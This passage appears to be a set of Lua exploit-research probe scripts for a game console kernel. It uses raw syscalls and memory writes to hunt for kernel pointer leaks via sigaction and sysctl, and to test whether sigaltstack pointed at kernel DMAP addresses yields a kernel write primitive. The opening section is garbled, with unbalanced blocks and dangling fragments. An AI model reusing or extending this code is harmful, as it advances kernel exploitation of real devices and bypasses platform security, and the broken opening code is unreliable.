    sc_sigprocmask = 340,
    sc_kill = 37,
    sc_getpid = 20,
    sc_close = 6,
    sc_socketpair = 135,
    sc_write = 4,
    sc_mmap = 477,
    sc_sysctl = 202,
})

-- PART 1: Full sigaction dump — which signals have custom handlers?
-- ============================================================
log("")
log("--- PART 1: full sigaction dump ---")

local SA_SIZE = 64
local old_sa = memory.alloc(SA_SIZE)
local new_sa = memory.alloc(SA_SIZE)

for sig = 1, 31 do
    -- Fill with marker
    for i = 0, SA_SIZE - 1 do memory.write_byte(old_sa + i, 0xDE) end

    -- Set to SIG_IGN to read old, then restore
    for i = 0, SA_SIZE - 1, 8 do memory.write_qword(new_sa + i, 0) end
    memory.write_qword(new_sa, 1)  -- SIG_IGN

    local sa_ok = pcall(function()
        syscall.sc_sigaction(sig, new_sa, old_sa)
    end)

    if sa_ok then
        local h_lo = memory.read_dword(old_sa):tonumber()
        local h_hi = memory.read_dword(old_sa + 4):tonumber()
        local flags = memory.read_dword(old_sa + 8):tonumber()
        local mask_lo = memory.read_dword(old_sa + 12):tonumber()
        local mask_hi = memory.read_dword(old_sa + 16):tonumber()

        -- Restore original
        pcall(function() syscall.sc_sigaction(sig, old_sa, new_sa) end)

        local tag = ""
        if h_lo == 0 and h_hi == 0 then tag = "DFL"
        elseif h_lo == 1 and h_hi == 0 then tag = "IGN"
        else tag = string.format("0x%08x%08x", h_hi, h_lo) end

        if tag ~= "DFL" then

        -- Check ALL bytes for kernel pointers
        for i = 0, SA_SIZE - 8, 8 do
            local lo = memory.read_dword(old_sa + i):tonumber()
            local hi = memory.read_dword(old_sa + i + 4):tonumber()
            if hi >= 0xFFFF0000 and i > 0 then
                log(string.format("    *** +%d: 0x%08x%08x LEAK? ***", i, hi, lo))
            end
        end
    end
end

-- PART 3: Verify sigaltstack kernel address acceptance

log("")
log("--- PART 3: sigaltstack kernel ranges ---")

local new_ss = memory.alloc(32)
local old_ss = memory.alloc(32)
local SS_DISABLE = 4

local test_addrs = {
    {0x0000000000001000, "user low"},
    {0x0000000040000000, "user 1GB"},
    {0x00007FFFFFFFE000, "user stack top"},
    {0xFFFFFFFF80000000, "kernel base -2M"},
    {0xFFFFFFFF80200000, "kernel text"},
    {0xFFFFFFFF81000000, "kernel +16M"},
    {0xFFFFFFFF90000000, "kernel high"},
    {0xFFFFF80000000000, "DMAP base"},
    {0xFFFFF80100000000, "DMAP +4G"},
    {0xFFFFFC0000000000, "VM page array?"},
    {0xFFFFFE0000000000, "kernel map?"},
    {0xFFFF800000000000, "PML4 self-map?"},
}

for _, ta in ipairs(test_addrs) do
    local addr = ta[1]
    local label = ta[2]

    local hi = math.floor(addr / 0x100000000)
    local lo = addr % 0x100000000

    memory.write_dword(new_ss, lo)
    memory.write_dword(new_ss + 4, hi)
    memory.write_qword(new_ss + 8, 8192)  -- ss_size
    memory.write_dword(new_ss + 16, 0)    -- enable

    local t_ok, t_ret = pcall(function()
        return syscall.sc_sigaltstack(new_ss, old_ss)
    end)
    local rv = t_ok and t_ret:tonumber() or -999
    log(string.format("  %-20s rv=%d", label, rv))

    -- Disable after each test
    if rv == 0 then
        memory.write_dword(new_ss + 16, SS_DISABLE)
        pcall(function() syscall.sc_sigaltstack(new_ss, old_ss) end)
    end

-- ============================================================
-- PART 4: Test if signal delivery uses altstack
-- Set altstack to a user buffer, send ourselves a signal,
-- check if the kernel wrote a signal frame there
-- ============================================================
log("")
log("--- PART 4: signal delivery to altstack ---")

-- Allocate a stack buffer and fill with marker
local STACK_SZ = 16384
local stack_buf = memory.alloc(STACK_SZ + 256)
for i = 0, STACK_SZ - 1, 8 do
    memory.write_qword(stack_buf + i, 0xAAAAAAAAAAAAAAAA)
end

-- Set altstack
memory.write_qword(new_ss, stack_buf)
memory.write_qword(new_ss + 8, STACK_SZ)
memory.write_dword(new_ss + 16, 0)

local ss_set_ok = pcall(function()
    syscall.sc_sigaltstack(new_ss, old_ss)
end)
log("  set altstack: " .. (ss_set_ok and "OK" or "FAIL"))

-- We can't actually set a real handler (Lua has no function pointers)
-- But we CAN set SA_ONSTACK flag and check if the flag is stored
local sa_new = memory.alloc(64)
local sa_old = memory.alloc(64)
for i = 0, 63, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1)  -- SIG_IGN
local SA_ONSTACK = 0x0001
memory.write_dword(sa_new + 8, SA_ONSTACK)  -- flags = SA_ONSTACK

    syscall.sc_sigaction(30, sa_new, sa_old) -- SIGUSR1=30
end)

local kill_ok, kill_ret = pcall(function()
    return syscall.sc_kill(pid, 30)
end)

    (kill_ok and "rv=" .. kill_ret:tonumber() or "ERR"))

    local v = memory.read_qword(stack_buf + i):tonumber()
    if v ~= 0xAAAAAAAAAAAAAAAA then
        overwritten = overwritten + 1
    end

    log("  *** SIGNAL FRAME WRITTEN TO ALTSTACK ***")

            if hi >= 0xFFFF0000 then tag = " *** KPTR ***" end

        end
    end

-- Disable altstack
memory.write_dword(new_ss + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(new_ss, old_ss) end)

for i = 0, 63, 8 do memory.write_qword(sa_new + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

log("")
log("=== SIGALT EXPLOIT DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
```

## probes/phase3_signals_codexec/24_sigalt_kwrite.lua

```lua
-- 14.10 Recon Probe 24: sigaltstack kernel write attempt + sysctl fix
-- PLAN:
-- Part 1: Fix sysctl to actually read kernel info
-- Part 2: Set altstack to USERLAND buffer, trigger SIGSEGV via handler,
--         verify signal frame is written (baseline)
-- Part 3: Set altstack to kernel address, trigger SIGSEGV,
--         check if process survives (copyout would fail gracefully)
-- Part 4: If we survive, check what happened — did kernel kill us,
--         did it write, or did copyout just return EFAULT?

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: SIGALT KWRITE ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_sigprocmask = 340,
    sc_kill = 37,
    sc_getpid = 20,
    sc_close = 6,
    sc_write = 4,
    sc_mmap = 477,
    sc_munmap = 73,
    sc_sysctl = 202,
    sc_socketpair = 135,
})

-- ============================================================
-- PART 1: sysctl — FIXED
-- The issue: passing any non-zero newp makes kernel think we're
-- writing. Must find a way to pass "no new value".
-- Try: large dummy ptr (not 0, not 1) with newlen=0
-- Or: use the actual memory.alloc ptr but set newlen=0
-- ============================================================
log("")
log("--- PART 1: sysctl info ---")

local mib = memory.alloc(32)
local val = memory.alloc(4096)
local vallen = memory.alloc(8)
-- For newp: allocate a real buffer but pass newlen=0
-- This should tell kernel "I have no new data"
local newp_buf = memory.alloc(64)

local function do_sysctl(m1, m2, miblen, label)
    memory.write_dword(mib, m1)
    memory.write_dword(mib + 4, m2)
    memory.write_qword(vallen, 4090)
    for i = 0, 511, 8 do memory.write_qword(val + i, 0) end

    local s_ok, s_ret = pcall(function()
        -- sysctl(mib, miblen, old, oldlen, new, newlen)
        -- key: newlen MUST be 0 for read-only
        return syscall.sc_sysctl(mib, miblen, val, vallen, newp_buf, 0)
    end)

    if not s_ok then
        log(string.format("  %-22s FAIL: %s", label, tostring(s_ret):sub(1, 30)))
        return
    end

    local rv = s_ret:tonumber()
    local actual_len = memory.read_qword(vallen):tonumber()

    if rv ~= 0 then
        log(string.format("  %-22s rv=%d", label, rv))
        return
    end

    if actual_len > 0 and actual_len <= 4090 then
        local b0 = memory.read_byte(val):tonumber()
        if b0 >= 32 and b0 < 127 then
            local str = {}
            for i = 0, math.min(actual_len - 1, 200) do
                local b = memory.read_byte(val + i):tonumber()
                if b >= 32 and b < 127 then str[#str + 1] = string.char(b)
                elseif b == 0 then break
                else str[#str + 1] = "." end
            end
            log(string.format("  %-22s \"%s\"", label, table.concat(str):sub(1, 120)))
        elseif actual_len <= 8 then
            local lo = memory.read_dword(val):tonumber()
            local hi = memory.read_dword(val + 4):tonumber()
            if actual_len <= 4 then
                log(string.format("  %-22s %d (0x%x)", label, lo, lo))
            else
                log(string.format("  %-22s 0x%08x%08x", label, hi, lo))
            end
        else
            log(string.format("  %-22s len=%d (binary)", label, actual_len))
        end
    else
        log(string.format("  %-22s len=%d rv=%d", label, actual_len, rv))
    end
end

-- Standard FreeBSD sysctl MIBs
do_sysctl(1, 1, 2, "kern.ostype")        -- CTL_KERN=1, KERN_OSTYPE=1
do_sysctl(1, 2, 2, "kern.osrelease")     -- KERN_OSRELEASE=2
do_sysctl(1, 4, 2, "kern.version")       -- KERN_VERSION=4
do_sysctl(1, 24, 2, "kern.osreldate")    -- KERN_OSRELDATE=24
do_sysctl(1, 27, 2, "kern.hostname")     -- KERN_HOSTNAME=27
do_sysctl(1, 14, 2, "kern.usrstack")     -- KERN_USRSTACK=14
do_sysctl(1, 33, 2, "kern.ps_strings")   -- KERN_PS_STRINGS=33
do_sysctl(6, 1, 2, "hw.machine")         -- CTL_HW=6, HW_MACHINE=1
do_sysctl(6, 2, 2, "hw.model")           -- HW_MODEL=2
do_sysctl(6, 3, 2, "hw.ncpu")            -- HW_NCPU=3
do_sysctl(6, 5, 2, "hw.physmem")         -- HW_PHYSMEM=5
do_sysctl(6, 11, 2, "hw.pagesize")       -- HW_PAGESIZE=11

-- ============================================================
-- PART 2: Baseline — signal frame on userland altstack
-- Set handler for SIGUSR1 (30) to the existing crash handler
-- address, set altstack to user buffer, send SIGUSR1
-- ============================================================
log("")
log("--- PART 2: baseline signal frame ---")

local SA_SIZE = 64
local SS_SIZE = 32
local STACK_SZ = 32768
local SA_ONSTACK = 0x0001
local SA_SIGINFO = 0x0040
local SS_DISABLE = 4

local sa_new = memory.alloc(SA_SIZE)
local sa_old = memory.alloc(SA_SIZE)
local ss_new = memory.alloc(SS_SIZE)
local ss_old = memory.alloc(SS_SIZE)

-- Allocate and fill user altstack with unique pattern per qword
local user_stack = memory.alloc(STACK_SZ)
for i = 0, STACK_SZ - 1, 8 do
    -- Write offset as pattern so we can see exactly where frame lands
    memory.write_dword(user_stack + i, 0xBBBB0000 + (i % 0x10000))
    memory.write_dword(user_stack + i + 4, 0xBBBBBBBB)
end

-- Set altstack to user buffer
memory.write_qword(ss_new, user_stack)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)

local ss_ok = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
log("  set user altstack: " .. (ss_ok and "OK" or "FAIL"))

-- Get current SIGUSR1 handler
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_old + i, 0) end
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1) -- SIG_IGN temp
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
-- Restore original
pcall(function() syscall.sc_sigaction(30, sa_old, sa_new) end)

local handler_lo = memory.read_dword(sa_old):tonumber()
local handler_hi = memory.read_dword(sa_old + 4):tonumber()
log(string.format("  SIGUSR1 handler: 0x%08x%08x", handler_hi, handler_lo))

-- Set SIGUSR1 to SIG_IGN with SA_ONSTACK to test frame delivery
-- Actually SIG_IGN won't build a frame... we need a REAL handler
-- The crash handler at 0x533118f4 IS a real handler
-- Set it with SA_ONSTACK | SA_SIGINFO
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_dword(sa_new, 0x533118f4)
memory.write_dword(sa_new + 4, 0)
memory.write_dword(sa_new + 8, SA_ONSTACK + SA_SIGINFO) -- flags

local siga_ok = pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
log("  set SIGUSR1 handler+ONSTACK: " .. (siga_ok and "OK" or "FAIL"))

-- Send SIGUSR1 to self
local pid = syscall.sc_getpid():tonumber()
log("  sending SIGUSR1 to self (pid=" .. pid .. ")...")

local kill_ok, kill_ret = pcall(function()
    return syscall.sc_kill(pid, 30)
end)
log("  kill: " .. (kill_ok and "rv=" .. kill_ret:tonumber() or "ERR"))

-- Check altstack for modifications
local frame_start = -1
local frame_end = -1
local kptrs_found = 0
local frame_data = {}

for i = 0, STACK_SZ - 8, 8 do
    local lo = memory.read_dword(user_stack + i):tonumber()
    local hi = memory.read_dword(user_stack + i + 4):tonumber()
    local expected_lo = 0xBBBB0000 + (i % 0x10000)
    local expected_hi = 0xBBBBBBBB

    if lo ~= expected_lo or hi ~= expected_hi then
        if frame_start < 0 then frame_start = i end
        frame_end = i + 8

        if hi >= 0xFFFF0000 then
            kptrs_found = kptrs_found + 1
        end

        if #frame_data < 80 then
            frame_data[#frame_data + 1] = {off = i, lo = lo, hi = hi}
        end
    end
end

log(string.format("  frame: start=0x%x end=0x%x size=%d bytes",
    frame_start >= 0 and frame_start or 0,
    frame_end >= 0 and frame_end or 0,
    frame_end - frame_start))
log("  kernel pointers in frame: " .. kptrs_found)

if #frame_data > 0 then
    log("  frame dump:")
    for _, d in ipairs(frame_data) do
        local tag = ""
        if d.hi >= 0xFFFFFFFF and d.lo >= 0x80000000 then tag = " [KTEXT]"
        elseif d.hi >= 0xFFFFF800 and d.hi < 0xFFFFFF00 then tag = " [DMAP]"
        elseif d.hi >= 0xFFFF0000 then tag = " [KHIGH]" end
        log(string.format("    +%04x: 0x%08x%08x%s", d.off, d.hi, d.lo, tag))
    end
end

-- Disable altstack
memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- Restore SIGUSR1 to DFL
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

-- ============================================================
-- PART 3: Kernel address altstack test
-- Set altstack to a kernel address, trigger signal
-- copyout() in sendsig() should fail with EFAULT
-- The kernel should then SIGSEGV the process (which we handle)
-- or just fail gracefully
-- ============================================================
log("")
log("--- PART 3: kernel altstack test ---")

-- Only do this if Part 2 showed signal frames work
if frame_start >= 0 then
    log("  signal frames confirmed working")

    -- Step 1: Set altstack to kernel DMAP address
    -- DMAP is writable in kernel context, so if copyout doesn't
    -- check the destination, it would write there
    local KADDR_HI = 0xFFFFF800
    local KADDR_LO = 0x10000000  -- DMAP + 256MB (likely valid RAM)

    memory.write_dword(ss_new, KADDR_LO)
    memory.write_dword(ss_new + 4, KADDR_HI)
    memory.write_qword(ss_new + 8, STACK_SZ)
    memory.write_dword(ss_new + 16, 0)

    local kss_ok = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
    log(string.format("  set kernel altstack 0x%08x%08x: %s",
        KADDR_HI, KADDR_LO, kss_ok and "OK" or "FAIL"))

    if kss_ok then
        -- Verify it was set
        local verify_ss = memory.alloc(SS_SIZE)
        memory.write_dword(ss_new + 16, SS_DISABLE) -- query via disable
        pcall(function() syscall.sc_sigaltstack(ss_new, verify_ss) end)
        local vsp_lo = memory.read_dword(verify_ss):tonumber()
        local vsp_hi = memory.read_dword(verify_ss + 4):tonumber()
        log(string.format("  verify altstack: 0x%08x%08x", vsp_hi, vsp_lo))

        -- Re-enable with kernel address
        memory.write_dword(ss_new, KADDR_LO)
        memory.write_dword(ss_new + 4, KADDR_HI)
        memory.write_qword(ss_new + 8, STACK_SZ)
        memory.write_dword(ss_new + 16, 0)
        pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

        -- Set SIGUSR2 (31) with SA_ONSTACK + the crash handler
        for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
        memory.write_dword(sa_new, 0x533118f4)
        memory.write_dword(sa_new + 4, 0)
        memory.write_dword(sa_new + 8, SA_ONSTACK + SA_SIGINFO)

        pcall(function() syscall.sc_sigaction(31, sa_new, sa_old) end)

        -- Block SIGUSR2 first so we can unblock and catch
        -- Actually just send it directly
        log("  sending SIGUSR2 with kernel altstack...")

        local k_kill_ok, k_kill_ret = pcall(function()
            return syscall.sc_kill(pid, 31)
        end)
        log("  kill(SIGUSR2): " ..
            (k_kill_ok and "rv=" .. k_kill_ret:tonumber() or "CRASH: " .. tostring(k_kill_ret):sub(1, 50)))

        -- If we're still alive, the kernel handled it somehow
        local alive = pcall(function() return syscall.sc_getpid() end)
        log("  alive after kernel altstack signal: " .. tostring(alive))

        if alive then
            log("  *** SURVIVED! Kernel either:")
            log("      1. copyout() failed EFAULT and signal was dropped")
            log("      2. copyout() wrote to kernel memory (!!)")
            log("      3. SA_ONSTACK was ignored")

            -- Check: is the altstack still set?
            local check_ss = memory.alloc(SS_SIZE)
            memory.write_dword(ss_new + 16, SS_DISABLE)
            pcall(function() syscall.sc_sigaltstack(ss_new, check_ss) end)
            local csp_lo = memory.read_dword(check_ss):tonumber()
            local csp_hi = memory.read_dword(check_ss + 4):tonumber()
            local cfl = memory.read_dword(check_ss + 16):tonumber()
            log(string.format("  altstack after: sp=0x%08x%08x flags=0x%x",
                csp_hi, csp_lo, cfl))
        end

        -- Disable altstack
        memory.write_dword(ss_new + 16, SS_DISABLE)
        pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

        -- Restore signal
        for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
        pcall(function() syscall.sc_sigaction(31, sa_new, sa_old) end)
    end
else
    log("  no signal frame in Part 2 — skipping kernel test")
end

-- ============================================================
-- PART 4: Additional sysctl scan for PS5-specific info
-- Try 3-level MIBs and known FreeBSD entries
-- ============================================================
log("")
log("--- PART 4: sysctl deep scan ---")

-- kern.proc.pid (CTL_KERN=1, KERN_PROC=14, KERN_PROC_PID=1)
-- This might give us our own proc struct info
memory.write_dword(mib, 1)      -- CTL_KERN
memory.write_dword(mib + 4, 14) -- KERN_PROC
memory.write_dword(mib + 8, 1)  -- KERN_PROC_PID
memory.write_dword(mib + 12, pid) -- our PID
memory.write_qword(vallen, 4090)
for i = 0, 511, 8 do memory.write_qword(val + i, 0) end

local proc_ok, proc_ret = pcall(function()
    return syscall.sc_sysctl(mib, 4, val, vallen, newp_buf, 0)
end)
if proc_ok then
    local plen = memory.read_qword(vallen):tonumber()
    log(string.format("  kern.proc.pid.%d: len=%d rv=%d", pid, plen, proc_ret:tonumber()))

    if plen > 0 and plen <= 4090 then
        -- Dump first 256 bytes looking for interesting data
        log("  proc struct dump:")
        for i = 0, math.min(plen - 1, 255), 8 do
            local lo = memory.read_dword(val + i):tonumber()
            local hi = memory.read_dword(val + i + 4):tonumber()
            if lo ~= 0 or hi ~= 0 then
                local tag = ""
                if hi >= 0xFFFF0000 then tag = " *** KPTR ***" end
                -- Check for strings
                local is_str = true
                for j = 0, 7 do
                    local b = memory.read_byte(val + i + j):tonumber()
                    if b ~= 0 and (b < 32 or b >= 127) then is_str = false end
                end
                if is_str and lo > 0 then
                    local s = ""
                    for j = 0, 7 do
                        local b = memory.read_byte(val + i + j):tonumber()
                        if b >= 32 and b < 127 then s = s .. string.char(b) end
                    end
                    if #s > 2 then tag = tag .. " \"" .. s .. "\"" end
                end
                log(string.format("    +%3d: 0x%08x%08x%s", i, hi, lo, tag))
            end
        end
    end
else
    log("  kern.proc.pid: " .. tostring(proc_ret):sub(1, 50))
end

-- Try some more sysctl
do_sysctl(1, 35, 2, "kern.maxproc")
do_sysctl(1, 6, 2, "kern.ngroups")
do_sysctl(1, 10, 2, "kern.maxvnodes")

log("")
log("=== SIGALT KWRITE DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

```lua
-- 14.10 Recon Probe 25: Safe kernel altstack test
-- Probe 24 showed: signal delivery to user altstack WORKS
-- The handler ran and corrupted Lua state
-- New approach:
-- 1. Set altstack to kernel addr
-- 2. Block the signal with sigprocmask
-- 3. Send signal (it becomes pending, not delivered)
-- 4. Check if anything happened
-- 5. Also: set altstack to kernel addr, but handler = SIG_IGN
--    SIG_IGN should not build a frame at all
-- 6. Test: does the kernel even touch ss_sp during sigaltstack()?
--    Maybe it reads/writes the pointed memory during the syscall

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: SIGALT SAFE ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_sigprocmask = 340,
    sc_sigpending = 343,
    sc_kill = 37,
    sc_getpid = 20,
    sc_close = 6,
    sc_write = 4,
    sc_mmap = 477,
    sc_munmap = 73,
    sc_sysctl = 202,
    sc_socketpair = 135,
})

local SA_SIZE = 64
local SS_SIZE = 32
local SA_ONSTACK = 0x0001
local SA_SIGINFO = 0x0040
local SS_DISABLE = 4
local SIG_BLOCK = 1
local SIG_UNBLOCK = 2
local SIG_SETMASK = 3

local sa_new = memory.alloc(SA_SIZE)
local sa_old = memory.alloc(SA_SIZE)
local ss_new = memory.alloc(SS_SIZE)
local ss_old = memory.alloc(SS_SIZE)
local pid = syscall.sc_getpid():tonumber()

-- ============================================================
-- PART 1: Verify signal frame baseline on user altstack
-- Use a pattern we can check reliably (not 0xAA which has
-- precision issues in Lua doubles)
-- ============================================================
log("")
log("--- PART 1: signal frame baseline ---")

local STACK_SZ = 16384
local user_stack = memory.alloc(STACK_SZ)

-- Fill with simple pattern: offset value as 32-bit int
for i = 0, STACK_SZ - 1, 4 do
    memory.write_dword(user_stack + i, 0x11110000 + i)
end

-- Set altstack
memory.write_qword(ss_new, user_stack)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- Set SIGUSR1 handler to crash handler with SA_ONSTACK
-- But first block SIGUSR1 so delivery is deferred
local mask = memory.alloc(16)
local old_mask = memory.alloc(16)

-- Block SIGUSR1 (bit 29, since SIGUSR1=30, 0-indexed = bit 29)
memory.write_qword(mask, 0)
memory.write_qword(mask + 8, 0)
-- Signal 30 = bit 29 in the mask
local sigusr1_bit = 2^29  -- SIGUSR1=30 is bit 29
memory.write_dword(mask, sigusr1_bit)  -- low 32 bits
-- Actually sigset_t on FreeBSD: signal N is in word (N-1)/32, bit (N-1)%32
-- SIGUSR1=30: word 0, bit 29
memory.write_dword(mask, 2^29)

pcall(function() syscall.sc_sigprocmask(SIG_BLOCK, mask, old_mask) end)
log("  blocked SIGUSR1")

-- Set handler with SA_ONSTACK
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_dword(sa_new, 0x533118f4)  -- crash handler
memory.write_dword(sa_new + 4, 0)
memory.write_dword(sa_new + 8, SA_ONSTACK + SA_SIGINFO)
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

-- Send SIGUSR1 (will be pending, not delivered)
pcall(function() syscall.sc_kill(pid, 30) end)
log("  sent SIGUSR1 (blocked, should be pending)")

-- Check pending
local pending = memory.alloc(16)
local sp_ok, sp_ret = pcall(function()
    return syscall.sc_sigpending(pending)
end)
if sp_ok then
    local pend_lo = memory.read_dword(pending):tonumber()
    log(string.format("  pending mask: 0x%08x (bit29=%s)",
        pend_lo, (pend_lo % (2^30) >= 2^29) and "SET" or "clear"))
end

-- Check altstack — NOT modified because signal not delivered
local modified = 0
for i = 0, STACK_SZ - 4, 4 do
    local v = memory.read_dword(user_stack + i):tonumber()
    if v ~= 0x11110000 + i then
        modified = modified + 1
    end
end
log("  altstack modified dwords (blocked): " .. modified)

-- Now UNBLOCK and let the signal deliver
-- This will run the crash handler — we need to survive
-- Actually... the crash handler will corrupt Lua. Don't do this yet.
-- Instead, change handler to SIG_IGN before unblocking
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1)  -- SIG_IGN
memory.write_dword(sa_new + 8, SA_ONSTACK)  -- still SA_ONSTACK
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
log("  changed handler to SIG_IGN (still ONSTACK)")

-- Unblock
memory.write_qword(mask, 0)
pcall(function() syscall.sc_sigprocmask(SIG_SETMASK, mask, old_mask) end)
log("  unblocked — pending signal should deliver")

-- Check altstack modification (SIG_IGN should NOT build frame)
modified = 0
for i = 0, STACK_SZ - 4, 4 do
    local v = memory.read_dword(user_stack + i):tonumber()
    if v ~= 0x11110000 + i then
        modified = modified + 1
    end
end
log("  altstack modified dwords (after IGN delivery): " .. modified)

-- Disable altstack
memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- ============================================================
-- PART 2: Kernel altstack with SIG_IGN
-- If SIG_IGN doesn't touch the altstack, then setting it to
-- kernel addr and sending an ignored signal is safe
-- ============================================================
log("")
log("--- PART 2: kernel altstack + SIG_IGN ---")

-- Set altstack to kernel DMAP
local KADDR_HI = 0xFFFFF800
local KADDR_LO = 0x10000000

memory.write_dword(ss_new, KADDR_LO)
memory.write_dword(ss_new + 4, KADDR_HI)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)

local kss_ok = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
log(string.format("  set kernel altstack: %s", kss_ok and "OK" or "FAIL"))

-- SIGUSR2 with SIG_IGN + SA_ONSTACK
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1)  -- SIG_IGN
memory.write_dword(sa_new + 8, SA_ONSTACK)
pcall(function() syscall.sc_sigaction(31, sa_new, sa_old) end)

-- Send SIGUSR2
local k_ok, k_ret = pcall(function()
    return syscall.sc_kill(pid, 31)
end)
log("  kill(SIGUSR2) with kernel altstack: " ..
    (k_ok and "rv=" .. k_ret:tonumber() or "CRASH"))

local alive1 = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive1))

-- Check altstack state
local check_ss = memory.alloc(SS_SIZE)
memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, check_ss) end)
local css_lo = memory.read_dword(check_ss):tonumber()
local css_hi = memory.read_dword(check_ss + 4):tonumber()
local css_fl = memory.read_dword(check_ss + 16):tonumber()
log(string.format("  altstack: sp=0x%08x%08x flags=0x%x", css_hi, css_lo, css_fl))

-- ============================================================
-- PART 3: Kernel altstack with REAL handler (blocked signal)
-- Set kernel altstack, set real handler with SA_ONSTACK,
-- send signal but keep it BLOCKED, then change to SIG_IGN
-- and unblock — if SIG_IGN path doesn't touch altstack, safe
-- ============================================================
log("")
log("--- PART 3: kernel altstack + blocked real handler ---")

-- Re-enable kernel altstack
memory.write_dword(ss_new, KADDR_LO)
memory.write_dword(ss_new + 4, KADDR_HI)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- Block SIGUSR2 (signal 31 = bit 30)
memory.write_dword(mask, 2^30)
memory.write_dword(mask + 4, 0)
pcall(function() syscall.sc_sigprocmask(SIG_BLOCK, mask, old_mask) end)

-- Set real handler with SA_ONSTACK
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_dword(sa_new, 0x533118f4)
memory.write_dword(sa_new + 4, 0)
memory.write_dword(sa_new + 8, SA_ONSTACK + SA_SIGINFO)
pcall(function() syscall.sc_sigaction(31, sa_new, sa_old) end)

-- Send signal (stays pending)
pcall(function() syscall.sc_kill(pid, 31) end)
log("  sent SIGUSR2 (blocked, kernel altstack, real handler)")

-- Check pending
pcall(function() syscall.sc_sigpending(pending) end)
local pend_lo2 = memory.read_dword(pending):tonumber()
log(string.format("  pending: 0x%08x (bit30=%s)",
    pend_lo2, (pend_lo2 % (2^31) >= 2^30) and "SET" or "clear"))

-- Change handler to SIG_DFL before unblocking
-- SIG_DFL for SIGUSR2 = terminate. But we're ignoring it...
-- Better: change to SIG_IGN, then unblock
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1)  -- SIG_IGN
memory.write_dword(sa_new + 8, 0)  -- NO SA_ONSTACK this time
pcall(function() syscall.sc_sigaction(31, sa_new, sa_old) end)
log("  changed to SIG_IGN (no ONSTACK)")

-- Also disable altstack before unblocking
memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
log("  disabled altstack")

-- Unblock
memory.write_qword(mask, 0)
pcall(function() syscall.sc_sigprocmask(SIG_SETMASK, mask, old_mask) end)
log("  unblocked SIGUSR2")

local alive2 = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive2))

-- ============================================================
-- PART 4: Test if sigaltstack validates ss_sp in kernel
-- by setting it to an unmapped userland address and triggering
-- signal delivery — if kernel crashes = no validation
-- ============================================================
log("")
log("--- PART 4: unmapped userland altstack ---")

-- Use a high userland address that's definitely unmapped
local UNMAPPED_HI = 0x00007FFF
local UNMAPPED_LO = 0xDEAD0000

memory.write_dword(ss_new, UNMAPPED_LO)
memory.write_dword(ss_new + 4, UNMAPPED_HI)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)

local uss_ok = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
log(string.format("  set unmapped altstack 0x%08x%08x: %s",
    UNMAPPED_HI, UNMAPPED_LO, uss_ok and "OK" or "FAIL"))

-- Send IGN signal (safe, no frame built)
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1)
memory.write_dword(sa_new + 8, SA_ONSTACK)
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

local u_ok, u_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
log("  kill with unmapped altstack + IGN: " ..
